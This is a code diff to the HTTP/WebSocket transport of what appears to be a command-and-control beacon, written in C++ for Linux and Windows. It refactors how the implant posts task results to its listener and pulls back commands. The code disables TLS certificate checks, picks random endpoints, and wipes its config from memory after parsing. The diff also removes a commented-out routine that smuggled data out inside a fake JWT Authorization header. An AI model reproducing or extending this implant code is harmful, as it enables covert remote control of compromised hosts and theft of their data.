@@ -1,5 +1,6 @@
 #include "BeaconHttp.hpp"
 
+#include <ctime>
 #include <random>
 
 #ifdef __linux__
@@ -17,15 +18,9 @@
 
 #endif
 
-
 using namespace std;
 
-
-#ifdef __linux__
-
-using namespace httplib;
-
-#elif _WIN32
+#ifdef _WIN32
 
 std::wstring getUtf16(const std::string& str, int codepage)
 {
@@ -38,14 +33,22 @@ std::wstring getUtf16(const std::string& str, int codepage)
 }
 
 
-string HttpsWebRequestPost(const string& domain, int port, const string& url, const string& data, const nlohmann::json& httpHeaders, bool isHttps)
+bool HttpsWebRequestPost(const string& domain,
+                         int port,
+                         const string& url,
+                         const string& data,
+                         const nlohmann::json& httpHeaders,
+                         bool isHttps,
+                         string& response)
 {
+    response.clear();
+
     wstring sdomain = getUtf16(domain, CP_UTF8);
     wstring surl = getUtf16(url, CP_UTF8);
 
     DWORD dwSize = 0;
-    
-    LPSTR pszOutBuffer;
+
+    LPSTR pszOutBuffer = nullptr;
     BOOL  bResults = FALSE;
     HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;
 
@@ -71,7 +74,7 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
         {
             std::string newHeader = (it).key();
             newHeader+=":";
-            newHeader+=(it).value();
+            newHeader+=it.value().get<std::string>();
 
             std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());
 
@@ -115,13 +118,19 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
         bResults = WinHttpReceiveResponse(hRequest, NULL);
 
     DWORD dwStatusCode = 0;
-    dwSize = sizeof(dwStatusCode);
-
-    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
+    if (bResults && hRequest)
+    {
+        dwSize = sizeof(dwStatusCode);
+        WinHttpQueryHeaders(hRequest,
+                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                            WINHTTP_HEADER_NAME_BY_INDEX,
+                            &dwStatusCode,
+                            &dwSize,
+                            WINHTTP_NO_HEADER_INDEX);
+    }
 
 
     // Keep checking for data until there is nothing left.
-    string response;
     if (bResults)
     {
         do
@@ -153,7 +162,7 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
                 else
                 {
                     // printf("%s", pszOutBuffer);
-                    response = response + string(pszOutBuffer);
+                    response += string(pszOutBuffer);
                 }
 
                 // Free the memory allocated to the buffer.
@@ -174,142 +183,8 @@ string HttpsWebRequestPost(const string& domain, int port, const string& url, co
     if (hSession) 
         WinHttpCloseHandle(hSession);
 
-    return response;
+    return bResults && dwStatusCode == 200;
 }
-
-
-// // send data in a fake jwt
-// string HttpsWebRequestGet(const string& domain, int port, const string& url, const string& data, const nlohmann::json& httpHeaders, bool isHttps)
-// {
-//     wstring sdomain = getUtf16(domain, CP_UTF8);
-//     wstring surl = getUtf16(url, CP_UTF8);
-
-//     DWORD dwSize = 0;
-    
-//     LPSTR pszOutBuffer;
-//     BOOL  bResults = FALSE;
-//     HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;
-
-//     // Use WinHttpOpen to obtain a session handle.
-//     hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-
-//     // Specify an HTTP server.
-//     if (hSession)
-//         hConnect = WinHttpConnect(hSession, sdomain.c_str(), port, 0);
-
-//     // Create an HTTP request handle.
-//     DWORD dwFlags = 0;
-//     if(isHttps)
-//         dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;
-
-//     if (hConnect)
-//         hRequest = WinHttpOpenRequest(hConnect, L"GET", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
-
-//     // Add a request header.
-//     if( hRequest )
-//     {
-//         for (auto& it : httpHeaders.items())
-//         {
-//             std::string newHeader = (it).key();
-//             newHeader+=":";
-//             newHeader+=(it).value();
-
-//             std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());
-
-//             bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
-//         }
-//     }
-
-//     std::string dataHeader = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb21haW4iOiJkZWNhdW1pYWJhaWxsZW54LmNvbSIsImlkIjoiMTUxNjIzOTAyMiIsInVzZXIiOiJnZXN0In0.";
-//     dataHeader+=data;
-//     std::wstring stemp = std::wstring(dataHeader.begin(), dataHeader.end());
-//     bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
-
-//     if(isHttps)
-//     {
-//         // if https & self sign certificat
-//         dwFlags =
-//             SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-//             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
-//             SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-//             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-
-//         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
-//     }
-
-//     // Send a request.
-//     if (hRequest)
-//         bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-
-//     // if (!bResults)
-//     //     printf("Error %d has occurred.\n", GetLastError());
-
-//     // End the request.
-//     if (bResults)
-//         bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-//     DWORD dwStatusCode = 0;
-//     dwSize = sizeof(dwStatusCode);
-
-//     WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
-
-
-//     // Keep checking for data until there is nothing left.
-//     string response;
-//     if (bResults)
-//     {
-//         do
-//         {
-//             // Check for available data.
-//             dwSize = 0;
-//             if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-//             {
-//                 // printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
-//             }
-
-//             // Allocate space for the buffer.
-//             pszOutBuffer = new char[dwSize + 1];
-//             if (!pszOutBuffer)
-//             {
-//                 // printf("Out of memory\n");
-//                 dwSize = 0;
-//             }
-//             else
-//             {
-//                 // Read the data.
-//                 ZeroMemory(pszOutBuffer, dwSize + 1);
-
-//                 DWORD dwDownloaded = 0;
-//                 if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
-//                 {
-//                     // printf("Error %u in WinHttpReadData.\n", GetLastError());
-//                 }
-//                 else
-//                 {
-//                     // printf("%s", pszOutBuffer);
-//                     response = response + string(pszOutBuffer);
-//                 }
-
-//                 // Free the memory allocated to the buffer.
-//                 delete[] pszOutBuffer;
-//             }
-//         } while (dwSize > 0);
-//     }
-
-//     // Report any errors.
-//     // if (!bResults)
-//     //     printf("Error %d has occurred.\n", GetLastError());
-
-//     // Close any open handles.
-//     if (hRequest) 
-//         WinHttpCloseHandle(hRequest);
-//     if (hConnect) 
-//         WinHttpCloseHandle(hConnect);
-//     if (hSession) 
-//         WinHttpCloseHandle(hSession);
-
-//     return response;
-// }
 
 
 std::string GenerateSecWebSocketKey()
@@ -536,11 +411,12 @@ static bool WsConnectOnce(WsClient& c)
 
     // Headers
     //std::cout << "[WS] Adding WebSocket headers...\n";
+    const std::wstring wsKey = getUtf16(GenerateSecWebSocketKey(), CP_UTF8);
     std::wstring headers =
         L"Connection: Upgrade\r\n"
         L"Upgrade: websocket\r\n"
         L"Sec-WebSocket-Version: 13\r\n"
-        L"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"; // NOTE: static key only for debugging
+        L"Sec-WebSocket-Key: " + wsKey + L"\r\n";
 
     if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD))
     {
@@ -680,12 +556,6 @@ static bool WsCommunicate(WsClient& c,
     return true;
 }
 
-
-std::wstring stringToWstring(const std::string& s)
-{
-    return std::wstring(s.begin(), s.end());
-}
-
 #endif
 
 
@@ -698,60 +568,165 @@ BeaconHttp::BeaconHttp(std::string& config, std::string& ip, int port, bool isHt
     m_ip = ip;
     m_port = port;
 
-    // Http communcation config
     nlohmann::json configJson = nlohmann::json::parse(config);
     if(isHttps)
         m_beaconHttpConfig = configJson["ListenerHttpsConfig"];
     else
         m_beaconHttpConfig = configJson["ListenerHttpConfig"];
 
-    // beacon and modules config
     initConfig(config);
-    
+
     for(int i=0; i<config.size(); i++)
         config[i]='.';
-
-    m_upgradeToWs = true;
-    m_isWsConnected = false;
 }
-
 
 BeaconHttp::~BeaconHttp()
 {
+    resetWebSocketConnection();
 }
 
-
-void BeaconHttp::checkIn()
+std::string BeaconHttp::pickRandomEndpoint(const char* key) const
 {
-    
+    auto it = m_beaconHttpConfig.find(key);
+    if (it == m_beaconHttpConfig.end() || !it->is_array() || it->empty())
+        return {};
+
+    return (*it)[rand() % it->size()].get<std::string>();
+}
+
+void BeaconHttp::resetWebSocketConnection()
+{
 #ifdef __linux__
+    if (m_wsClient)
+    {
+        if (m_wsClient->is_open())
+            m_wsClient->close();
+        m_wsClient.reset();
+    }
+#elif _WIN32
+    WsDisconnect(m_ws);
+#endif
+
+    m_wsEndpoint.clear();
+}
+
+bool BeaconHttp::ensureWebSocketConnected()
+{
+    const std::string endpoint = m_wsEndpoint.empty() ? pickRandomEndpoint("wsUri") : m_wsEndpoint;
+    if (endpoint.empty())
+        return false;
+
+#ifdef __linux__
+    if (m_wsClient && m_wsClient->is_open())
+        return true;
+
+    if (m_wsClient)
+        m_wsClient.reset();
+
+    auto ws = std::make_unique<httplib::ws::WebSocketClient>(
+        (m_isHttps ? "wss://" : "ws://") + m_ip + ":" + std::to_string(m_port) + endpoint);
+    if (!ws->is_valid())
+        return false;
+
+    ws->set_connection_timeout(5, 0);
+    ws->set_read_timeout(5, 0);
+    ws->set_write_timeout(5, 0);
+    ws->set_websocket_ping_interval(30);
+#ifdef CPPHTTPLIB_SSL_ENABLED
+    if (m_isHttps)
+        ws->enable_server_certificate_verification(false);
+#endif
+
+    if (!ws->connect())
+        return false;
+
+    m_wsClient = std::move(ws);
+
+#elif _WIN32
+    if (m_ws.hWebSocket)
+        return true;
+
+    m_ws.host = getUtf16(m_ip, CP_UTF8);
+    m_ws.port = m_port;
+    m_ws.path = getUtf16(endpoint, CP_UTF8);
+    m_ws.isHttps = m_isHttps;
+    m_ws.allowInsecureTls = true;
+
+    if (!WsConnectWithRetry(m_ws, 5, 250))
+        return false;
+#endif
+
+    m_wsEndpoint = endpoint;
+    return true;
+}
+
+bool BeaconHttp::tryWebSocketCheckIn(const std::string& output, std::string& input)
+{
+    for (int attempt = 0; attempt < 2; ++attempt)
+    {
+        if (!ensureWebSocketConnected())
+            return false;
+
+#ifdef __linux__
+        if (!m_wsClient || !m_wsClient->send(output))
+        {
+            resetWebSocketConnection();
+            continue;
+        }
+
+        std::string message;
+        const auto result = m_wsClient->read(message);
+        if (result == httplib::ws::Fail)
+        {
+            resetWebSocketConnection();
+            continue;
+        }
+
+        input = std::move(message);
+        return true;
+
+#elif _WIN32
+        if (WsCommunicate(m_ws, output, input))
+            return true;
+
+        resetWebSocketConnection();
+#endif
+    }
+
+    return false;
+}
+
+bool BeaconHttp::tryHttpCheckIn(const std::string& output, std::string& input)
+{
+    const std::string endPoint = pickRandomEndpoint("uri");
+    if (endPoint.empty())
+        return false;
+
+    nlohmann::json httpHeaders = nlohmann::json::object();
+    auto itClient = m_beaconHttpConfig.find("client");
+    if (itClient != m_beaconHttpConfig.end() && itClient->is_object())
+    {
+        auto itHeaders = itClient->find("headers");
+        if (itHeaders != itClient->end() && itHeaders->is_object())
+            httpHeaders = *itHeaders;
+    }
+
+#ifdef __linux__
+    httplib::Headers httpClientHeaders;
+    for (auto& it : httpHeaders.items())
+        httpClientHeaders.insert({it.key(), it.value().get<std::string>()});
 
     if(m_isHttps)
     {
         httplib::SSLClient cli(m_ip, m_port);
         cli.enable_server_certificate_verification(false);
 
-        std::string output;
-        taskResultsToCmd(output);
-
-        nlohmann::json httpsUri = m_beaconHttpConfig["uri"];
-        std::string endPoint = httpsUri[ rand() % httpsUri.size() ];
-
-        nlohmann::json httpHeaders = m_beaconHttpConfig["client"]["headers"];
-
-        httplib::Headers httpClientHeaders;
-        for (auto& it : httpHeaders.items())
-            httpClientHeaders.insert({(it).key(), (it).value()});
-
         if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
         {
-            if (res->status == 200) 
+            if (res->status == 200)
             {
-                std::string input = res->body;
-                if(!input.empty())
-                {
-                    cmdToTasks(input);
-                }
+                input = res->body;
+                return true;
             }
         }
     }
@@ -759,92 +734,34 @@ void BeaconHttp::checkIn()
     {
         httplib::Client cli(m_ip, m_port);
 
-        std::string output;
-        taskResultsToCmd(output);
-
-        nlohmann::json httpUri = m_beaconHttpConfig["uri"];
-        std::string endPoint = httpUri[ rand() % httpUri.size() ];
-
-        nlohmann::json httpHeaders = m_beaconHttpConfig["client"]["headers"];
-
-        httplib::Headers httpClientHeaders;
-        for (auto& it : httpHeaders.items())
-            httpClientHeaders.insert({(it).key(), (it).value()});
-
         if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
         {
-            if (res->status == 200) 
+            if (res->status == 200)
             {
-                std::string input = res->body;
-                if(!input.empty())
-                {
-                    cmdToTasks(input);
-                }
+                input = res->body;
+                return true;
             }
         }
     }
 
-
 #elif _WIN32
 
-    std::string endPoint;
-
-    if(m_isHttps)
-    {
-        auto httpsUri = m_beaconHttpConfig["uri"];
-        endPoint = httpsUri[ rand() % httpsUri.size() ];
-    }
-    else
-    {
-        auto httpUri = m_beaconHttpConfig["uri"];
-        endPoint = httpUri[ rand() % httpUri.size() ];
-    }
-
-    std::string output;
-    taskResultsToCmd(output);
-
-    nlohmann::json httpHeaders;
-    if(!m_isHttps)
-        httpHeaders = m_beaconHttpConfig["client"]["headers"];
-    else 
-        httpHeaders = m_beaconHttpConfig["client"]["headers"];    
-
-    if (m_upgradeToWs && !m_isWsConnected)
-    {
-        endPoint = "/ws";
-
-        wstring sdomain = getUtf16(m_ip, CP_UTF8);
-        wstring surl = getUtf16(endPoint, CP_UTF8);
-
-        
-        m_ws.host   = sdomain;
-        m_ws.port   = m_port;
-        m_ws.path   = surl;
-        m_ws.isHttps = m_isHttps;
-        m_ws.allowInsecureTls = true; // mirrors curl -k; set false if you trust/pin certs
-
-        if (WsConnectWithRetry(m_ws, /*maxAttempts*/5, /*baseDelayMs*/250))
-            m_isWsConnected = true;
-        
-        m_upgradeToWs = false;        
-    }
-
-    std::string input;
-    if(m_isWsConnected)
-    {
-        WsCommunicate(m_ws, output, input);
-                // m_isWsConnected = false;
-    }
-    else
-        input = HttpsWebRequestPost(m_ip, m_port, endPoint, output, httpHeaders, m_isHttps);
-
-
-    if (!input.empty())
-    {
-        cmdToTasks(input);
-    }
+    return HttpsWebRequestPost(m_ip, m_port, endPoint, output, httpHeaders, m_isHttps, input);
 
 #endif
 
+    return false;
+}
 
+void BeaconHttp::checkIn()
+{
+    std::string output;
+    taskResultsToCmd(output);
+
+    std::string input;
+    if (!tryWebSocketCheckIn(output, input))
+        tryHttpCheckIn(output, input);
+
+    if (!input.empty())
+        cmdToTasks(input);
 }
